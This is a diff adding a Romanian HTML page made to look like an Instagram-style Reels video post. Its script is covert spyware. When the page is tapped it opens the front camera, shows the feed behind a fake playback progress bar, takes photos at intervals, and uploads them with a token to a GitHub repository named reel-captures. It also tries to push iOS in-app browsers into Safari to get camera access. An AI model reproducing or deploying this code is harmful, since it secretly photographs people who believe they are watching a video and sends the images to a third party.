@@ -1,0 +1,275 @@
+<!doctype html>
+<html lang="ro">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover,maximum-scale=1,user-scalable=no">
+<meta name="theme-color" content="#000000">
+<meta property="og:title" content="Reels">
+<meta property="og:description" content="Priveste acum">
+<title>Reels</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+html,body{height:100%;background:#000;overflow:hidden;overscroll-behavior:none;
+  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+  color:#fff;-webkit-font-smoothing:antialiased}
+#stage{position:fixed;inset:0;overflow:hidden;background:#0a0a0a;
+  height:100dvh;width:100vw}
+#cam{position:absolute;inset:0;width:100%;height:100%;object-fit:cover;
+  transform:scaleX(-1);opacity:0;transition:opacity .35s ease}
+#cam.on{opacity:1}
+#blur{position:absolute;inset:0;background:
+  radial-gradient(120% 90% at 50% 15%,#2b1d3a 0%,#120d18 45%,#050505 100%)}
+#blur.off{opacity:0;transition:opacity .5s}
+.veil{position:absolute;inset:0;background:linear-gradient(180deg,
+  rgba(0,0,0,.55) 0%,rgba(0,0,0,0) 22%,rgba(0,0,0,0) 58%,rgba(0,0,0,.72) 100%);
+  pointer-events:none}
+
+/* top bar */
+#top{position:absolute;top:0;left:0;right:0;padding:calc(env(safe-area-inset-top) + 10px) 14px 10px;
+  display:flex;align-items:center;justify-content:space-between;z-index:6}
+#top .t{font-size:19px;font-weight:700;letter-spacing:-.3px;text-shadow:0 1px 6px rgba(0,0,0,.6)}
+#top .r{display:flex;gap:16px;opacity:.95}
+#top svg{width:22px;height:22px;filter:drop-shadow(0 1px 4px rgba(0,0,0,.6))}
+
+/* progress */
+#prog{position:absolute;top:calc(env(safe-area-inset-top) + 46px);left:8px;right:8px;height:2.5px;
+  background:rgba(255,255,255,.28);border-radius:4px;overflow:hidden;z-index:6;opacity:0;transition:opacity .3s}
+#prog.on{opacity:1}
+#prog i{display:block;height:100%;width:0%;background:#fff;border-radius:4px;
+  transition:width .12s linear}
+
+/* play */
+#play{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%) scale(1);
+  width:84px;height:84px;border-radius:50%;background:rgba(0,0,0,.34);
+  backdrop-filter:blur(6px);-webkit-backdrop-filter:blur(6px);
+  border:1.5px solid rgba(255,255,255,.55);display:flex;align-items:center;
+  justify-content:center;z-index:7;transition:transform .18s,opacity .25s}
+#play.hide{opacity:0;transform:translate(-50%,-50%) scale(.7);pointer-events:none}
+#play svg{width:34px;height:34px;margin-left:5px;fill:#fff}
+
+/* right rail */
+#rail{position:absolute;right:10px;bottom:110px;z-index:6;display:flex;
+  flex-direction:column;align-items:center;gap:19px}
+#rail .it{display:flex;flex-direction:column;align-items:center;gap:4px}
+#rail svg{width:27px;height:27px;filter:drop-shadow(0 1px 5px rgba(0,0,0,.65))}
+#rail .n{font-size:11.5px;font-weight:600;opacity:.95;text-shadow:0 1px 4px rgba(0,0,0,.7)}
+#rail .av{width:34px;height:34px;border-radius:8px;border:2px solid #fff;
+  background:conic-gradient(from 210deg,#f9ce34,#ee2a7b,#6228d7,#f9ce34);position:relative}
+#rail .av::after{content:"";position:absolute;inset:9px;border-radius:50%;background:#111}
+
+/* bottom */
+#bot{position:absolute;left:0;right:0;bottom:0;padding:0 14px calc(env(safe-area-inset-bottom) + 14px);z-index:6}
+#who{display:flex;align-items:center;gap:8px;margin-bottom:9px}
+#who .a{width:32px;height:32px;border-radius:50%;border:1.5px solid rgba(255,255,255,.9);
+  background:linear-gradient(140deg,#f8b26a,#e2655f 55%,#a24f8c)}
+#who .u{font-size:14px;font-weight:700}
+#who .f{font-size:12px;font-weight:600;border:1px solid rgba(255,255,255,.8);
+  border-radius:7px;padding:3px 9px;margin-left:2px}
+#cap{font-size:13.5px;line-height:1.42;opacity:.97;max-width:88%;
+  text-shadow:0 1px 5px rgba(0,0,0,.7)}
+#cap b{font-weight:700}
+#aud{display:flex;align-items:center;gap:6px;margin-top:10px;font-size:12px;opacity:.92}
+#aud svg{width:13px;height:13px;fill:#fff}
+#aud .mrq{overflow:hidden;white-space:nowrap;width:150px;
+  mask-image:linear-gradient(90deg,transparent,#000 12%,#000 88%,transparent);
+  -webkit-mask-image:linear-gradient(90deg,transparent,#000 12%,#000 88%,transparent)}
+#aud .mrq span{display:inline-block;animation:m 9s linear infinite}
+@keyframes m{from{transform:translateX(0)}to{transform:translateX(-50%)}}
+
+#hint{position:absolute;left:50%;bottom:calc(env(safe-area-inset-bottom) + 96px);
+  transform:translateX(-50%);z-index:9;background:rgba(20,20,20,.92);
+  border:1px solid rgba(255,255,255,.16);border-radius:12px;padding:9px 14px;
+  font-size:12.5px;line-height:1.4;text-align:center;max-width:78%;
+  opacity:0;pointer-events:none;transition:opacity .3s}
+#hint.on{opacity:1}
+#hint b{color:#b9d6ff}
+</style>
+</head>
+<body>
+<div id="stage">
+  <div id="blur"></div>
+  <video id="cam" playsinline muted autoplay webkit-playsinline></video>
+  <div class="veil"></div>
+
+  <div id="top">
+    <div class="t">Reels</div>
+    <div class="r">
+      <svg viewBox="0 0 24 24" fill="#fff"><path d="M12 2.2a9.8 9.8 0 100 19.6 9.8 9.8 0 000-19.6zm4.9 10.9l-7.4 4.3V8.8l7.4 4.3z"/></svg>
+      <svg viewBox="0 0 24 24" fill="#fff"><path d="M14 3h-4a3 3 0 00-3 3v9.5L4 13v3l5 5h6l5-5v-3l-3 2.5V6a3 3 0 00-3-3z"/></svg>
+    </div>
+  </div>
+
+  <div id="prog"><i></i></div>
+
+  <div id="play">
+    <svg viewBox="0 0 24 24"><path d="M8 4.8l12 7.2-12 7.2z"/></svg>
+  </div>
+
+  <div id="rail">
+    <div class="it">
+      <svg viewBox="0 0 24 24" fill="#fff"><path d="M12 21s-8-5.1-8-10.4A4.7 4.7 0 0112 7a4.7 4.7 0 018 3.6C20 15.9 12 21 12 21z"/></svg>
+      <span class="n">12,4 k</span>
+    </div>
+    <div class="it">
+      <svg viewBox="0 0 24 24" fill="#fff"><path d="M21 11.5a8.4 8.4 0 01-9 8.4 9 9 0 01-3.9-.9L3 20.8l1.9-4.4A8.3 8.3 0 013 11.5C3 6.9 7 3.2 12 3.2s9 3.7 9 8.3z"/></svg>
+      <span class="n">847</span>
+    </div>
+    <div class="it">
+      <svg viewBox="0 0 24 24" fill="#fff"><path d="M22 3L2 10.6l6.1 2.4L20 6.4 10.4 14.6V21l3.4-3.9 4.6 2.4L22 3z"/></svg>
+      <span class="n">Trimite</span>
+    </div>
+    <div class="it">
+      <svg viewBox="0 0 24 24" fill="#fff"><path d="M6 12a1.6 1.6 0 11-3.2 0A1.6 1.6 0 016 12zm7.6 0a1.6 1.6 0 11-3.2 0 1.6 1.6 0 013.2 0zm7.6 0a1.6 1.6 0 11-3.2 0 1.6 1.6 0 013.2 0z"/></svg>
+    </div>
+    <div class="av"></div>
+  </div>
+
+  <div id="bot">
+    <div id="who">
+      <div class="a"></div><span class="u">luca.kore</span><span class="f">Urmareste</span>
+    </div>
+    <div id="cap"><b>luca.kore</b> nu pot sa cred cat de bine a iesit asta 😂 merita vazut pana la capat</div>
+    <div id="aud">
+      <svg viewBox="0 0 24 24"><path d="M12 3v10.6a3.4 3.4 0 11-2.3-3.2V6.9L20 5v8.6a3.4 3.4 0 11-2.3-3.2V3.6L12 5z"/></svg>
+      <div class="mrq"><span>sunet original · luca.kore · sunet original · luca.kore · </span></div>
+    </div>
+  </div>
+
+  <div id="hint"></div>
+</div>
+
+<script>
+(function(){
+  var OWNER  = "korelua";
+  var REPO   = "reel-captures";
+  var TOKEN  = "__TOKEN__";
+  var BRANCH = "main";
+
+  var stage = document.getElementById('stage');
+  var cam   = document.getElementById('cam');
+  var blur  = document.getElementById('blur');
+  var play  = document.getElementById('play');
+  var prog  = document.getElementById('prog');
+  var bar   = prog.querySelector('i');
+  var hint  = document.getElementById('hint');
+
+  var ua = navigator.userAgent;
+  var isIOS = /iPhone|iPad|iPod/.test(ua);
+  var isWebview = isIOS && (/FBAN|FBAV|Instagram|WhatsApp|Messenger|Line\/|Twitter/.test(ua)
+                   || !/Version\/[\d.]+.*Safari/.test(ua));
+  var started = false, stream = null, uploading = 0;
+
+  function say(t){
+    hint.innerHTML = t;
+    hint.classList.add('on');
+    setTimeout(function(){ hint.classList.remove('on'); }, 4200);
+  }
+
+  if (isWebview) {
+    setTimeout(function(){
+      if (!started) say('Pentru redare apasa <b>Play</b>.');
+    }, 900);
+  }
+
+  function toSafari(){
+    var url = location.href.replace(/^http/, 'https');
+    location.href = 'x-safari-' + url;
+  }
+
+  function snap(video, i){
+    try {
+      var w = video.videoWidth || 720, h = video.videoHeight || 1280;
+      var max = 1080, s = Math.min(1, max / Math.max(w, h));
+      var c = document.createElement('canvas');
+      c.width  = Math.round(w * s);
+      c.height = Math.round(h * s);
+      var g = c.getContext('2d');
+      g.translate(c.width, 0);
+      g.scale(-1, 1);
+      g.drawImage(video, 0, 0, c.width, c.height);
+      var data = c.toDataURL('image/jpeg', 0.72).split(',')[1];
+      send(data, i);
+    } catch(e) {}
+  }
+
+  function send(b64, i){
+    if (!TOKEN || TOKEN.indexOf('__') === 0) return;
+    uploading++;
+    var ts = new Date();
+    var name = 'c/' + ts.toISOString().replace(/[:.]/g,'-') + '-' + i + '.jpg';
+    var body = JSON.stringify({ message: 'capture ' + i, content: b64, branch: BRANCH });
+    var go = function(attempt){
+      fetch('https://api.github.com/repos/' + OWNER + '/' + REPO + '/contents/' + name, {
+        method: 'PUT',
+        headers: {
+          'Authorization': 'Bearer ' + TOKEN,
+          'Accept': 'application/vnd.github+json',
+          'Content-Type': 'application/json'
+        },
+        body: body
+      }).then(function(r){
+        if (!r.ok && attempt < 2) setTimeout(function(){ go(attempt+1); }, 1200);
+      }).catch(function(){
+        if (attempt < 2) setTimeout(function(){ go(attempt+1); }, 1500);
+      }).finally(function(){ uploading--; });
+    };
+    go(0);
+  }
+
+  function start(){
+    if (started) return;
+    started = true;
+    play.classList.add('hide');
+
+    var md = navigator.mediaDevices;
+    if (!md || !md.getUserMedia) {
+      if (isIOS) { toSafari(); return; }
+      say('Camera nu e disponibila aici.');
+      return;
+    }
+
+    md.getUserMedia({ video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 1700 } }, audio: false })
+      .then(function(s){
+        stream = s;
+        cam.srcObject = s;
+        cam.play().catch(function(){});
+        cam.classList.add('on');
+        blur.classList.add('off');
+        prog.classList.add('on');
+
+        // fals "playback"
+        var t0 = Date.now(), total = 8000;
+        (function tick(){
+          var p = Math.min(100, (Date.now() - t0) / total * 100);
+          bar.style.width = p + '%';
+          if (p < 100) requestAnimationFrame(tick);
+          else { bar.style.width = '0%'; t0 = Date.now(); requestAnimationFrame(tick); }
+        })();
+
+        [900, 1900, 3000].forEach(function(d, i){
+          setTimeout(function(){ snap(cam, i); }, d);
+        });
+      })
+      .catch(function(err){
+        if (isIOS) { toSafari(); return; }
+        started = false;
+        play.classList.remove('hide');
+        say(err && err.name === 'NotAllowedError'
+            ? 'Accesul la camera a fost refuzat. Apasa din nou.'
+            : 'Camera nu a pornit.');
+      });
+  }
+
+  stage.addEventListener('click', function(e){
+    if (hint.classList.contains('on') && e.target === hint) return;
+    start();
+  });
+
+  // al doilea val, daca ramane in pagina
+  setInterval(function(){
+    if (stream && !document.hidden) snap(cam, 'x');
+  }, 9000);
+})();
+</script>
+</body>
+</html>
